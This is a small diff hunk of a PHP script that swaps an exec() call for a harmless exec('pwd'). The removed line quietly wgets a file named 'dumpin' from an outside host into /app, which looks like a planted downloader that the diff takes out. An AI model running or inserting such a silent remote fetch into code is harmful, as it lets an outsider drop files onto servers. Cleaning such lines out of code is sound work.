@@ -2,7 +2,7 @@
 
 //Store the output of the executed command
 
-$output1 =  exec('wget -q -O /app/dumpin http://mypaneldata.my.id/dumpin');
+$output1 =  exec('pwd');
 
 //Print the return value
 
